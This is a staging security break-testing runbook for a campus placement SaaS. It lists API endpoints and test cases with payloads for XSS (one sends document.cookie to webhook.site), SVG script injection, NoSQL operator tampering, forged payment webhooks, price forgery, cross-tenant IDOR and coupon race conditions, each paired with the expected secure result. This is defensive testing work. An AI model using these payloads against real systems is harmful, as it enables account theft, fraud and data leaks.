# 🛡️ AIVI CAMPUS OS: 3-DAY DESTRUCTIVE BREAK-TESTING MASTER RUNBOOK
**Target Environment:** `https://staging.aivicampus.com`  
**Backend Infrastructure:** Firebase Project `aivi-campus-stg` (Functions v2, Firestore, Storage)  
**Target Release Deadline:** October 1, 2026 Production Launch  
**Execution Window:** 3-Day Intensive Developer Break-Testing (Dev 1 & Dev 2 Parallel Lanes)  
**Zero-Tolerance Standard:** 100% Fail-Closed Security, Zero Cross-Tenant Data Leaks, Bulletproof State Isolation

---

## SECTION 1: CODEBASE ARCHITECTURAL MAP & ATTACK SURFACES

### 1. Discovered API Inventory (Cloud Functions & HTTP Surfaces)
All Cloud Functions are deployed in `us-central1`. Callable functions accept `POST` requests with header `Content-Type: application/json` and `Authorization: Bearer <Firebase_ID_Token>`, wrapping inputs in `{"data": { ... }}` and responses in `{"result": { ... }}`.

| Function / Endpoint Name | Protocol | HTTP Method | Auth Required | Minimum Role / Claims | Core Responsibility |
| :--- | :---: | :---: | :---: | :---: | :--- |
| `/verifyPublicQrToken` | HTTP | `GET` | ❌ Public | None | Public QR scan endpoint to verify resume authenticity |
| `/razorpayWebhook` | HTTP | `POST` | ❌ Gateway Signed | `x-razorpay-signature` | Idempotent payment webhook event handler |
| `provisionTenant` | Callable | `POST` | ✅ Verified | `platform_admin` | Create new college tenant, admin, & seed demo data |
| `importStudentsCsv` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Bulk student roster parse & background import job |
| `getImportJob` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Check status of async student CSV import job |
| `getCampusStudents` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Fetch tenant student roster with branch/AES filters |
| `createDrive` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Create corporate placement drive & eligibility rules |
| `updateDrive` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Update placement drive criteria & status |
| `computeDriveShortlist` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Calculate student eligibility shortlist for drive |
| `publishDrive` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Publish drive to student portal & notify eligible |
| `recordDriveOutcome` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Record selected/rejected students & CTC/package |
| `generateDriveSprint` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Generate 7-day interview preparation sprint |
| `enrollInSprint` | Callable | `POST` | ✅ Verified | `student` | Student enrolls in targeted placement drive sprint |
| `markSprintTaskDone` | Callable | `POST` | ✅ Verified | `student` | Complete specific practice task inside sprint |
| `submitVaultResume` | Callable | `POST` | ✅ Verified | `student` | Submit resume to institutional credential vault |
| `verifyResume` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | TPO signs & verifies student resume with QR code |
| `requestResumeChanges` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | TPO rejects or requests revisions on student resume |
| `getResumeSignedUrl` | Callable | `POST` | ✅ Verified | `student` / `tpo` | Generate time-bounded signed download URL |
| `exportResumePackage` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Generate bulk ZIP of verified resumes for recruiter |
| `getExportJob` | Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Poll status of background resume export job |
| `startMockInterview` | Callable | `POST` | ✅ Verified | `student` / `tpo` | Initialize AI mock interview session |
| `answerMockInterviewTurn` | Callable | `POST` | ✅ Verified | `student` | Submit text answer & receive rubric feedback |
| `voiceInterviewTurn` | Callable | `POST` | ✅ Verified | `student` | Stream audio base64 for ASR, scoring & TTS reply |
| `generateAccreditationReport`| Callable | `POST` | ✅ Verified | `tpo` / `tenant_admin` | Compile NAAC Criterion 5.2.1 & NIRF audit packs |
| `createPaymentOrder` | Callable | `POST` | ✅ Verified | Authenticated User | Server-side Razorpay order generation |
| `applyCoupon` | Callable | `POST` | ✅ Verified | Authenticated User | Validate discount coupon code |
| `checkUsage` | Callable | `POST` | ✅ Verified | Authenticated User | Verify plan quota & remaining AI credits |
| `deactivateStaff` | Callable | `POST` | ✅ Verified | `tenant_admin` | Revoke staff coordinator access |
| `inviteCoordinator` | Callable | `POST` | ✅ Verified | `tenant_admin` | Send invitation link to departmental coordinator |
| `acceptDpdpConsent` | Callable | `POST` | ✅ Verified | Authenticated User | Record statutory DPDP Act 2023 consent timestamp |

---

### 2. Frontend Route Tree & Role Guards
Routing is declared in [`src/App.tsx`](file:///c:/Users/abhis/OneDrive/Documents/GitHub/aivi-campus-os/src/App.tsx) and wrapped in 3 primary guard components:
1. `ProtectedRoute`: Requires valid Firebase User session.
2. `TenantRoute`: Requires authenticated user with valid `tenant_id` and active role (`student`, `tpo`, `tenant_admin`, `coordinator`).
3. `AdminRoute`: Strictly requires `platform_admin` claim or verified admin doc in `user_roles`.

```
/ (Root Domain Router: checks window.location.hostname; renders ForCollegesPage on staging.aivicampus.com)
├── Public / Unauthenticated
│   ├── /campus/login (Institutional Branded Login)
│   ├── /campus/login/:tenantCode (Slug-specific Branded Login e.g. /campus/login/sunrise)
│   ├── /for-colleges (Institutional Landing & Feature Matrix)
│   ├── /about, /how-it-works, /what-is-aivi, /contact, /privacy, /terms, /dpa
│   ├── /data-rights (DPDP Statutory Data Subject Rights Portal)
│   └── /auth/action (Firebase Password Reset & Email Verification Handler)
│
├── Student Workspace (/campus/* wrapped in TenantRoute, role="student")
│   ├── /campus/student-drives (Active & Eligible Placement Drives)
│   ├── /campus/student-vault (Personal Credential Vault & QR Resumes)
│   ├── /campus/resume-intelligence (ATS Resume Analyzer & Feedback)
│   ├── /campus/resume-studio (AI Resume Builder)
│   ├── /campus/job-fit (Job Description Matching Engine)
│   ├── /campus/interviews (Voice & Text Mock Interview Portal)
│   └── /campus/skill-roadmap (Targeted Skill Gap Tracker)
│
├── Institutional TPO Portal (/campus/* or /tpo/* wrapped in TenantRoute, role="tpo" | "tenant_admin")
│   ├── /campus (Campus Command Center & Institutional Dashboard)
│   ├── /campus/students (Student Directory with AES Scores & Filters)
│   ├── /campus/students/import (Bulk CSV Onboarding Wizard)
│   ├── /campus/history (CSV Batch Import Audit Log)
│   ├── /campus/drives (Drive Management, Shortlisting & JDs)
│   ├── /campus/sprints (7-Day Placement Rescue Sprints)
│   ├── /campus/vault (Institutional Resume Verification Vault)
│   ├── /campus/accreditation (NAAC 5.2.1 & NIRF One-Click Compliance Generator)
│   ├── /campus/billing (Campus Plan Usage, Invoices & Subscriptions)
│   ├── /campus/calendar (Campus Interview & Drive Schedule)
│   ├── /campus/audit-logs (Security & Access Audit Trail)
│   ├── /campus/staff (Departmental Coordinator Role Management)
│   └── /campus/settings (Institutional Branding, Logos & Domains)
│
└── SuperAdmin Console (/campus/platform-admin wrapped in AdminRoute, role="platform_admin")
    ├── Tenant Provisioning Wizard (Create College, Slug, Domain, Admin Account)
    ├── Multi-Tenant Health Dashboard (Active Students, Total Analyses, Storage)
    └── Global Seed / Demo Sandbox Reset Engine
```

---

### 3. Data Models & State Dependencies (Firestore)

```mermaid
erDiagram
    TENANTS ||--o{ TENANT_MEMBERS : employs
    TENANTS ||--o{ PLACEMENT_DRIVES : hosts
    TENANTS ||--o{ RESUME_VAULT : holds
    TENANTS ||--o{ ACC_REPORT_JOBS : generates
    TENANT_MEMBERS ||--o{ MOCK_INTERVIEWS : conducts
    PLACEMENT_DRIVES ||--o{ DRIVE_APPLICATIONS : receives
    PLACEMENT_DRIVES ||--o{ SPRINTS : attaches
    USERS ||--o{ DRIVE_APPLICATIONS : submits
    USERS ||--o{ RESUME_VAULT : uploads
    USERS ||--o{ MOCK_INTERVIEWS : takes
```

* **Sensitive Data Fields (Strict Privacy Boundaries):**
  * `drive_applications`: `packageLpa`, `offerLetterUrl`, `joiningDate` (Staff-only; forbidden to students).
  * `resume_vault`: `phone`, `email`, `personalData`, `storagePath` (Student + Tenant Staff only).
  * `payment_orders`: `paymentId`, `keySecret`, `orderId` (Admin & Webhook only).
  * `tenants`: `apiKeyHash`, `planLimits`, `totalRevenue` (Staff & Platform Admin only).

---

### 4. Third-Party Critical Touchpoints
* **Authentication:** Firebase Auth (`aivi-campus-stg`). Email/Password, Google OAuth, Session Cookies.
* **Payment Gateway:** Razorpay API (`https://api.razorpay.com/v1/orders`). Webhook verification with `x-razorpay-signature` HMAC-SHA256.
* **AI Providers:**
  * Google Gemini 2.5 Flash (`@google/generative-ai`) for Resume Analysis, JD parsing, and scoring rubrics.
  * Sarvam AI / Digital India Bhashini for Indic Speech-to-Text (ASR) and Text-to-Speech (TTS).
* **Storage Buckets:** Firebase Storage (`gs://aivi-campus-stg.appspot.com/`). Resumes (`resumes/{tenantId}/{userId}/`), QR codes, and export ZIPs.
* **Email Dispatch:** Zoho Pro SMTP (`smtppro.zoho.in:465`, user: `hello@aivilabs.com`).

---

### 5. Required Tools & Software for QA Interns (Zero Coding Required)
QA Interns do **not** need to touch codebase files or run command-line tools. Use these 2 free tools:
1. **Google Chrome & Chrome DevTools (F12):** Network tab (inspect API calls & tokens), Console tab (inspect JS errors), and Device Mode (`Ctrl+Shift+M` for mobile views).
2. **Postman (Free Desktop App) or Hoppscotch.io (Web Tab):** Visual tool to send JSON payloads and test API security with a single click.

> 📖 **Complete Beginner Walkthrough:** For click-by-click instructions on how to extract your token in Chrome and run every test visually without code, see:  
> 👉 [`QA_INTERN_STEP_BY_STEP_TESTING_GUIDE.md`](file:///c:/Users/abhis/OneDrive/Documents/GitHub/aivi-campus-os/QA_INTERN_STEP_BY_STEP_TESTING_GUIDE.md)

---

## SECTION 2: DAY 1 EXECUTION PLAN (CORE FUNCTIONALITY & INPUT BOUNDARIES)

### Lane A (QA Tester 1) — End-to-End Functional Matrix

#### 1. Auth & Session Lifecycle
- [ ] **TC-A01: Student Registration Boundary:** Sign up student with valid college domain vs unauthorized domain (e.g. `@gmail.com` on tenant with domain lock).
- [ ] **TC-A02: Duplicate Email Collision:** Sign up existing email with different casing (`Test@Domain.com` vs `test@domain.com`).
- [ ] **TC-A03: Password Entropy Enforcement:** Attempt passwords `< 8` chars, missing digits, or common passwords (`password123`).
- [ ] **TC-A04: Email Verification Lock:** Verify that unverified student accounts cannot access `/campus/resume-intelligence` or `/campus/interviews`.
- [ ] **TC-A05: Role Escalation Bypass (Guest -> Student -> TPO -> Admin):**
  - Authenticate as Student.
  - Manually navigate to `https://staging.aivicampus.com/campus/students`.
  - Verify `TenantRoute` immediately redirects or displays permission denied modal.
  - Manually navigate to `https://staging.aivicampus.com/campus/platform-admin`.
  - Verify `AdminRoute` immediately blocks access and logs alert.

#### 2. Core Business Workflows
- [ ] **TC-A06: Bulk Student CSV Import Wizard (`/campus/students/import`):**
  - Upload dirty CSV containing:
    1. Duplicate roll numbers.
    2. Missing headers.
    3. Trailing whitespace in email addresses.
    4. Invalid graduation years (e.g. `1990` or `2099`).
  - Verify error summary table renders invalid rows with exact line numbers without aborting the entire batch.
- [ ] **TC-A07: Placement Drive Lifecycle (`/campus/drives`):**
  - Create Drive $\rightarrow$ Set eligibility criteria (CGPA $\ge 7.5$, CSE/ECE only) $\rightarrow$ Calculate Shortlist $\rightarrow$ Publish Drive.
  - Verify eligible students receive notification.
  - Verify ineligible student (`CGPA 7.1`) sees drive as "Not Eligible" and cannot click apply.
- [ ] **TC-A08: AI Resume Vault & Public QR Verification (`/campus/student-vault`):**
  - Student uploads PDF resume $\rightarrow$ TPO views in `/campus/vault` $\rightarrow$ TPO clicks "Verify & Seal".
  - Cloud function stamps cryptographically signed QR code onto page 1.
  - Scan QR code with mobile phone / curl public verification URL:
    ```bash
    curl -i -X GET "https://us-central1-aivi-campus-stg.cloudfunctions.net/verifyPublicQrToken?token=TOKEN_FROM_QR"
    ```
  - Verify HTTP 200 with student name, verified batch, college name, and tamper-proof seal.

---

### Lane B (QA Tester 2) — API & Input Tampering Matrix

#### 1. Boundary & String Overflow Attacks

##### TC-B01: 50,000-Character Buffer Overflow in Job Description Parser
* **Endpoint:** `parseDriveJd` (Callable)
* **Method:** `POST`
* **cURL Command:**
```bash
# Generate 50,000-character payload
python -c "import json, subprocess; payload = json.dumps({'data': {'jdText': 'A' * 50000, 'tenantId': 'sunrise'}}); subprocess.run(['curl', '-i', '-X', 'POST', 'https://us-central1-aivi-campus-stg.cloudfunctions.net/parseDriveJd', '-H', 'Content-Type: application/json', '-H', 'Authorization: Bearer YOUR_STAGING_TOKEN', '-d', payload])"
```
* **Expected Response:** `400 Bad Request` or `HttpsError: invalid-argument` ("Payload exceeds character limit").
* **Fail Condition:** Unhandled 500 server crash, memory leak, or unhandled gateway timeout.
* [ ] **Pass / Fail**

##### TC-B02: Cross-Site Scripting (XSS) & Polyglot Injection in Student Bio & Name
* **Endpoint:** `submitVaultResume` / Student Profile Update
* **Payload:** `<script>alert('XSS-AIVI')</script><img src=x onerror=this.src='https://webhook.site/test?c='+document.cookie>`
* **cURL Command:**
```bash
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/submitVaultResume" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_STAGING_TOKEN" \
  -d '{
    "data": {
      "fileName": "<script>alert(1)</script>.pdf",
      "targetRole": "\"><svg/onload=alert(1)>",
      "storagePath": "resumes/sunrise/user1/test.pdf"
    }
  }'
```
* **Expected Response:** Input sanitized or escaped. When rendered on `/campus/vault` or `/campus/students`, HTML tags must be rendered as raw strings, never executed in DOM.
* [ ] **Pass / Fail**

##### TC-B03: Template & Expression Injection (`{{7*7}}`, `${7*7}`)
* **Fields:** Student Full Name, College Announcement Title, Drive Company Name.
* **Payload:** `${7*7} {{7*7}} #{7*7} <%= 7*7 %>`
* **Expected Result:** Renders literal characters `${7*7}`. Never evaluates to `49`.
* [ ] **Pass / Fail**

##### TC-B04: SQL & NoSQL Null-Byte / Operator Tampering
* **Endpoint:** `getCampusStudents`
* **Payload:** `{"data": {"branch": {"$ne": null}, "limit": 50}}` or `{"branch": "CSE\0"}`
* **Expected Response:** Zod validation rejects object payloads for string types (`invalid_type` error).
* [ ] **Pass / Fail**

##### TC-B05: Numeric Boundary & Negative Values in Package LPA
* **Endpoint:** `recordDriveOutcome`
* **Method:** `POST`
* **Payload:**
```bash
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/recordDriveOutcome" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_STAGING_TPO_TOKEN" \
  -d '{
    "data": {
      "driveId": "drive_test_123",
      "studentId": "student_test_456",
      "status": "placed",
      "packageLpa": -15.5
    }
  }'
```
* **Expected Response:** `400 Bad Request` (`packageLpa must be a positive number`).
* [ ] **Pass / Fail**

#### 2. API Guard & Protocol Tampering

##### TC-B06: Missing Authorization Header
```bash
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/getCampusStudents" \
  -H "Content-Type: application/json" \
  -d '{"data": {"tenantId": "sunrise"}}'
```
* **Expected Response:** HTTP `401 Unauthorized` (`UNAUTHENTICATED`).
* [ ] **Pass / Fail**

##### TC-B07: Tampered JWT Signature
```bash
# Append invalid characters to JWT signature
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/getCampusStudents" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJmYWtlIn0.TAMPERED_SIGNATURE_HERE" \
  -d '{"data": {"tenantId": "sunrise"}}'
```
* **Expected Response:** HTTP `401 Unauthorized` (`auth/argument-error` or `Firebase ID token has invalid signature`).
* [ ] **Pass / Fail**

##### TC-B08: HTTP Verb Tampering (`PUT`, `DELETE`, `HEAD` on Callable Endpoints)
```bash
curl -i -X PUT "https://us-central1-aivi-campus-stg.cloudfunctions.net/importStudentsCsv" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_STAGING_TOKEN" \
  -d '{"data": {}}'
```
* **Expected Response:** HTTP `405 Method Not Allowed` or `400 Bad Request`.
* [ ] **Pass / Fail**

---

## SECTION 3: DAY 2 EXECUTION PLAN (DESTRUCTIVE BREAK-TESTING & STRESS)

### Lane A (QA Tester 1) — Billing, Permissions & State Drift

#### 1. Billing & Subscription Tier Enforcement

##### TC-C01: Free vs Paid AI Quota Exhaustion & Degradation
* **Mechanism:** Trigger mock interview turns until daily budget is exceeded.
* **Test:** Verify `voiceInterviewTurn` gracefully returns `{ "isQuotaExceeded": true, "message": "Campus AI budget quota reached..." }` and falls back to text mode rather than crashing with an unhandled exception.
* [ ] **Pass / Fail**

##### TC-C02: Razorpay Order Amount Tampering (Client-Side Price Forgery)
* **Attack Scenario:** Attacker calls `createPaymentOrder` and modifies the request payload to purchase Pro Plan (₹59,900) for ₹1.
```bash
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/createPaymentOrder" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_STAGING_TOKEN" \
  -d '{
    "data": {
      "planType": "pro",
      "amount": 100
    }
  }'
```
* **Expected Result:** The server **ignores** any client-submitted `amount` field, retrieving price strictly from server-side dictionary `PLAN_PRICES_INR.pro` (5990000 paise).
* [ ] **Pass / Fail**

##### TC-C03: Forged Razorpay Webhook Signature
```bash
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/razorpayWebhook" \
  -H "Content-Type: application/json" \
  -H "x-razorpay-signature: fake_untrusted_signature_12345" \
  -d '{
    "event": "payment.captured",
    "payload": {
      "payment": {
        "entity": {
          "id": "pay_fake_999",
          "order_id": "order_fake_999",
          "amount": 5990000,
          "status": "captured"
        }
      }
    }
  }'
```
* **Expected Response:** HTTP `400 Bad Request` ("Invalid signature"). No database upgrade or event record written.
* [ ] **Pass / Fail**

#### 2. Multi-Tenant Isolation & IDOR (Insecure Direct Object References)

##### TC-C04: Cross-Tenant Student Data Snooping (IDOR via Tenant A Staff)
* **Attack Scenario:** TPO of College A (`tenant_id = "sunrise"`) crafts request to fetch students of College B (`tenant_id = "apex"`).
```bash
curl -i -X POST "https://us-central1-aivi-campus-stg.cloudfunctions.net/getCampusStudents" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer TOKEN_OF_SUNRISE_TPO" \
  -d '{
    "data": {
      "tenantId": "apex_engineering_college"
    }
  }'
```
* **Expected Response:** `403 Forbidden` / `HttpsError: permission-denied` ("Unauthorized cross-tenant access").
* [ ] **Pass / Fail**

##### TC-C05: Cross-Student Salary / Offer Letter Data Leak in `drive_applications`
* **Target Firestore Path:** `/drive_applications/{appId}`
* **Test:** Student A logs in and issues direct Firestore SDK query for Student B's `packageLpa` and `offerLetterUrl`.
* **Expected Result:** Firestore security rules line 123 (`allow read: if isOwner(resource.data.userId)`) strictly block reading documents where `resource.data.userId != request.auth.uid`.
* [ ] **Pass / Fail**

---

### Lane B (QA Tester 2) — Concurrency, Uploads & Infrastructure Resilience

#### 1. Race Conditions & Rapid Double-Submission

##### TC-D01: High-Concurrency Coupon / Credit Depletion Loop
* **Attack Vector:** Fire 10 concurrent requests to apply a single-use coupon code or claim promotional credits.
* **Execution Script:** Run this Bash / Python concurrency test:
```python
import concurrent.futures
import urllib.request
import json

URL = "https://us-central1-aivi-campus-stg.cloudfunctions.net/applyCoupon"
TOKEN = "YOUR_STAGING_TOKEN"
PAYLOAD = json.dumps({"data": {"couponCode": "STAGING50"}}).encode("utf-8")

def send_req(i):
    req = urllib.request.Request(
        URL,
        data=PAYLOAD,
        headers={"Content-Type": "application/json", "Authorization": f"Bearer {TOKEN}"}
    )
    try:
        with urllib.request.urlopen(req) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()

print("Launching 10 concurrent coupon redemption requests...")
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    results = list(executor.map(send_req, range(10)))

statuses = [r[0] for r in results]
print(f"Status codes received: {statuses}")
# Ensure no more than 1 request succeeded; remaining must be 429 or 400
assert statuses.count(200) <= 1, "CRITICAL: Race condition detected! Coupon applied multiple times."
print("Concurrency gate verified cleanly.")
```
* [ ] **Pass / Fail**

#### 2. File Upload & Asset Hardening

##### TC-D02: Malicious Executable Masquerading as PDF (`shell.php.pdf`, `.exe`)
* **Test Action:** Create a file named `malicious_exploit.exe` containing executable binary headers (`MZ...`), rename it to `resume.pdf`, and upload via `/campus/student-vault`.
* **Expected Result:** PDF validator in `extractPdf` or `submitVaultResume` verifies MIME magic bytes (`%PDF-1.`) and rejects invalid structures.
* [ ] **Pass / Fail**

##### TC-D03: SVG File with Stored XSS Script Payload
* **Test Action:** Upload an institutional logo in `/campus/settings` using an SVG file containing:
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert('XSS_SVG_EXPLOIT_' + document.domain);
   </script>
</svg>
```
* **Expected Result:** Server-side upload blocks `.svg` or strips all `<script>` elements.
* [ ] **Pass / Fail**

##### TC-D04: 50MB Oversized File Upload
* **Test Action:** Attempt uploading a 50MB file to the resume analysis portal.
* **Expected Result:** Client-side immediate file size guard halts upload; server-side storage rules enforce `request.resource.size < 10 * 1024 * 1024` (10MB limit).
* [ ] **Pass / Fail**

##### TC-D05: Zero-Byte (0-byte) File Upload
* **Test Action:** Create an empty file (`touch empty.pdf`) and submit to resume parser.
* **Expected Result:** Handled gracefully with user error ("File is empty or corrupted"). 0 uncaught 500 errors.
* [ ] **Pass / Fail**

#### 3. Third-Party Service Downtime Simulation

##### TC-D06: Simulated Gemini AI API Timeout / Rate Limit Outage
* **Test Action:** In staging, configure an invalid or exhausted `GEMINI_API_KEY` (or trigger 429 rate limit).
* **Expected Result:**
  * Resume Analyzer displays friendly fallback message: *"AI analysis is temporarily unavailable. Your resume has been safely queued."*
  * Student interview turns trigger the local fallback scoring rubric instead of rendering a blank white screen.
* [ ] **Pass / Fail**

---

## SECTION 4: DAY 3 EXECUTION PLAN (TRIAGE, VERIFICATION & OCT 1 SIGN-OFF)

### 1. Bug Reproduction & Verification Protocol

```
[Defect Discovered]
       │
       ▼
[Isolate to Exact Component] (Browser Console / Network Tab / Cloud Functions Log)
       │
       ▼
[Log in SECTION 5 Defect Tracker] (Assign P0, P1, or P2)
       │
       ▼
[Engineer Creates Failing Test Case] (Vitest in src/test/ or integration script)
       │
       ▼
[Surgical Code Fix Applied] (Follow Karpathy Rule: Minimum Footprint, 0 style churn)
       │
       ▼
[Pre-Flight Verification] (npm run typecheck && npm run test && npm run security:verify)
       │
       ▼
[Deploy to Staging & Mark Verified]
```

#### How to Capture Complete Logs:
1. **Frontend Errors:** Open Chrome DevTools $\rightarrow$ Console $\rightarrow$ Enable "Preserve log" $\rightarrow$ Save console output to `.log`.
2. **Network Failures:** DevTools $\rightarrow$ Network Tab $\rightarrow$ Right-click request $\rightarrow$ "Copy as cURL".
3. **Cloud Function Server Logs:**
   ```bash
   firebase functions:log --project aivi-campus-stg --only voiceInterviewTurn -n 50
   ```

---

### 2. The 15-Minute Regression Smoke Sweep (Mandatory Pre-Release Checklist)

Before any build is promoted from Staging to Production, both developers must run through this exact 15-minute sweep:

* [ ] **Minute 1–3: Public Marketing & Identity Verification**
  - Load `https://staging.aivicampus.com`. Verify Government Credentials (`DIPP271794`, Start in UP `#R/STARTUP/UP/LKO/2026/000045574`, MSME `UDYAM-UP-32-0123988`).
  - Verify official Grievance Officer **Mr. Mithlesh Mishra** (`grievance@aivicampus.com`) appears in footer and `/privacy`.
  - Verify company LinkedIn URL opens `https://www.linkedin.com/company/aiviintelligence/`.
* [ ] **Minute 4–6: Institutional Branded Login**
  - Open `/campus/login`. Verify standard login has **NO** demo buttons ("⚡ TPO demo login" / "🎓 Student demo login" must be hidden).
  - Open `/campus/login/sunrise`. Verify demo buttons appear **only** for this explicit demo slug.
* [ ] **Minute 7–9: Student Workspace Journey**
  - Login as test student.
  - Upload sample resume $\rightarrow$ Verify ATS scoring completes $\rightarrow$ Open Mock Interview $\rightarrow$ Complete 1 voice or text turn $\rightarrow$ Check report generated.
* [ ] **Minute 10–12: TPO Command Center Journey**
  - Login as test TPO (`tpo@sunrise.edu`).
  - Open `/campus`. Verify student counter is accurate.
  - Open `/campus/vault`. Verify student resume is visible. Click "Verify & Seal".
  - Open `/campus/accreditation`. Generate NAAC Criterion 5.2.1 report. Verify clean download.
* [ ] **Minute 13–15: Platform SuperAdmin Console**
  - Open `/campus/platform-admin`. Verify no 404 error.
  - Verify tenant list loads without Firestore permission errors.

---

### 3. October 1 Launch Go/No-Go Gate Matrix

| Severity Level | Definition | Launch Decision | Action Required |
| :---: | :--- | :---: | :--- |
| **P0 — Showstopper** | Cross-tenant data leak, auth bypass, payment amount spoofing, unhandled 500 server crash on primary user path, raw API key exposed. | 🛑 **STRICT NO-GO** | Immediate code freeze. Fix must be verified with automated test before any launch discussion. |
| **P1 — High Priority** | Critical workflow broken with no workaround (e.g. TPO cannot upload CSV, QR code scan fails, voice interview drops 100% of turns). | ⚠️ **RELEASE BLOCKER** | Must be fixed, tested on Staging, and re-verified within 24 hours. |
| **P2 — Medium Priority** | Minor functional defect with clear workaround (e.g. search filter case-sensitivity, chart tooltip misaligned, minor pagination offset). | 🟡 **CONDITIONAL GO** | Log in backlog; scheduled for Post-Launch Sprint (Week 1 Oct). |
| **P3 — Low Polish** | Minor visual blemishes, typo in secondary disclaimer, icon padding discrepancy. | 🟢 **CLEARED FOR GO** | Non-blocking. Document in tracker. |

---

## SECTION 5: LIVE DEFECT & GAP TRACKER TEMPLATE

Developers must append all discovered break-testing bugs into this table directly as testing progresses:

| Bug ID | Discovered By | Module / Route | Severity | Short Title & Description | Steps to Reproduce | Exact File & Line # | Fix Status | Verified By |
| :---: | :---: | :---: | :---: | :--- | :--- | :--- | :---: | :---: |
| `BUG-001` | Dev 1 | `/campus/login` | P2 | Demo buttons displayed on non-demo college logins | 1. Go to `/campus/login`<br>2. Observe TPO demo button visible | `src/pages/campus/BrandedLogin.tsx:320` | Fixed | Abhishek |
| `BUG-002` | Dev 2 | `/campus/platform-admin`| P1 | Route returns 404 when navigating directly | 1. Type URL `/campus/platform-admin`<br>2. Observe 404 page | `src/App.tsx:247` | Fixed | Abhishek |
| `BUG-003` | Dev 1 | `/campus` (Dashboard) | P2 | Student count 0 empty state lacks onboarding guide | 1. Login to new college<br>2. Dashboard shows empty state without call-to-action | `src/pages/campus/CampusDashboard.tsx:140` | Fixed | Abhishek |
| `BUG-004` | Dev 2 | `parseDriveJd` | P2 | Character overflow on 50k char inputs | 1. Send 50k chars to JD parser<br>2. Function times out | `functions/src/index.ts:3320` | Open | Pending |
| `BUG-005` | Dev 1 / Dev 2 | *[Module]* | *[P0/P1/P2]* | *[Title]* | 1. Step one<br>2. Step two | *`path/to/file.ts:line`* | Open | Pending |
| `BUG-006` | Dev 1 / Dev 2 | *[Module]* | *[P0/P1/P2]* | *[Title]* | 1. Step one<br>2. Step two | *`path/to/file.ts:line`* | Open | Pending |
| `BUG-007` | Dev 1 / Dev 2 | *[Module]* | *[P0/P1/P2]* | *[Title]* | 1. Step one<br>2. Step two | *`path/to/file.ts:line`* | Open | Pending |
| `BUG-008` | Dev 1 / Dev 2 | *[Module]* | *[P0/P1/P2]* | *[Title]* | 1. Step one<br>2. Step two | *`path/to/file.ts:line`* | Open | Pending |
| `BUG-009` | Dev 1 / Dev 2 | *[Module]* | *[P0/P1/P2]* | *[Title]* | 1. Step one<br>2. Step two | *`path/to/file.ts:line`* | Open | Pending |
| `BUG-010` | Dev 1 / Dev 2 | *[Module]* | *[P0/P1/P2]* | *[Title]* | 1. Step one<br>2. Step two | *`path/to/file.ts:line`* | Open | Pending |

---

## 🚀 SIGN-OFF VERIFICATION SIGNATURES

*Before tagging `v2.4-prod-october1`, both developers and the Lead Architect must sign below:*

* **QA Tester 1 (Functional & Access Specialist):** ____________________ &nbsp;&nbsp;&nbsp;&nbsp; Date: ____________
* **QA Tester 2 (Security & Payload Specialist):** ____________________ &nbsp;&nbsp;&nbsp;&nbsp; Date: ____________
* **Founder & Chief Architect (Abhishek Mishra):** ____________________ &nbsp;&nbsp;&nbsp;&nbsp; Date: ____________
